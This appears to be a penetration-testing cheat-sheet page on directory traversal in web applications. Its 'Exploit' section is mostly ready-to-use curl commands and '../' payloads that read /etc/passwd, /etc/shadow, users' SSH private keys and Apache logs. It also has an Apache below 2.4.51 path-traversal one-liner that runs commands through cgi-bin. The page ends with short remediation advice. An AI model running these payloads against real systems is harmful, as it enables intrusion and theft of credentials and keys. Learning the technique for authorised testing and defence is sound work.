---
layout: default
title: Directory Transversal
parent: Web Applications
nav_order: 2
permalink: /webapps/directory/
---

# Page
{: .no_toc }

## Table of contents
{: .no_toc .text-delta }

1. TOC
{:toc}

---

## Vulnerability

If filesystem's permissions are not correctly set on the system hosting the web applications, you could take advantage of this to perform Directory Transversal (or Path Transversal). This attack consists in manipulating `../` sequences to escape the context of the web application to access arbitrary files and directory stored on the system. By doing this, you could gain access to useful information on the target.

## Prerequisites

* Network route to the web application.

## Exploit

```bash
# In PHP.
curl http://$domain/whatever/index.php?page="$path"
```

You can try following paths:

```bash
# You can put as many "../" as you want! It works if you reach filesystem's root.
"../../../../../../../../../../../../../../../../../../../../../../etc/passwd"
"../../../../../../../../../../../../../../../../../../../../../../etc/shadow"
"../../../../../../../../../../../../../../../../../home/username/.ssh/id_rsa"
"../../../../../../../../../../../../../../../../var/log/apache2/access.log"

# Sometimes, you'll need to encode URLs With UTF-8 Unicode encoding.
exit

# With Path Transversal vulnerability on Apache < 2.4.51.
curl -s --path-as-is -d "echo Content-Type: text/plain; echo; $3" "$target/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/home/$username/.bashrc"

# Test this one, it is readable by all users on Windows hosts.
"C:\Windows\System32\drivers\etc\hosts"
```

## Useful links

* [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Directory%20Traversal) for more payloads.
* [URL Encoder](https://www.urlencoder.org/) to encode URLs.

## Recommendations

- [ ] Enforce strict permissions on the underlying filesystem.
- [ ] Check URIs are correct and are not escaping the application context before processing them.